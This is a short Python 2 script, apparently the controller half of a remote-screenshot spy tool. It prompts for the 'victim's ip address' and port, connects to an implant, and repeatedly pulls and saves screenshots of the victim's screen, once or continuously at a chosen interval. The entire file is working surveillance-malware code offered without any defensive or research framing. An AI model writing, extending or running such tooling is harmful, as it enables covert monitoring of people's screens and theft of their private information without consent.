#Author: Yogesh Ingale

import socket
import time

def get_remote_screenshot(s):
	filename = s.recv(30)
	f=open(filename,"wb")
	while True:
		try:
			data=s.recv(1000000)
		except:
			break
		if not data:
			break
		f.write(data)
	f.close()
	print ("Received screenshot %s\n")%filename


try:
	ip = raw_input("\nEnter victim's ip address: ")
	port = raw_input("\nEnter vitim's port to connect (default 54321): ")
	if port == '':
		port = 54321
	else:
		port = int(port)

	while True:
		print ("1. Take screenshot\n2. Take screenshot countinuously\nEnter Ctrl+c to exit program.")
		choice = raw_input("\nEnter your choice: ")
		if not choice.isdigit() or (choice is not '1' and choice is not '2'):
			print ("Enter proper choice...")
			continue
		if int(choice) == 1:
			s=socket.socket()
			s.settimeout(2)
			s.connect((ip,port))
			s.send(choice)
			get_remote_screenshot(s)
			s.close()
		elif int(choice) == 2:
			interval = raw_input("Enter time interval between continuos screenshots (in int seconds): ")
			s=socket.socket()
			s.settimeout(2)
			s.connect((ip,port))
			s.send(choice)
			s.send(interval)
			while True:
				get_remote_screenshot(s)
				if int(interval) > 2:
 					time.sleep(int(interval)-2) 
				else: 
					time.sleep(int(interval))
				s.send("ok")
except KeyboardInterrupt:
	s.close()
	print ("Program terminated")
except:
	print ("Something went wrong, check all inputs, socket connection")




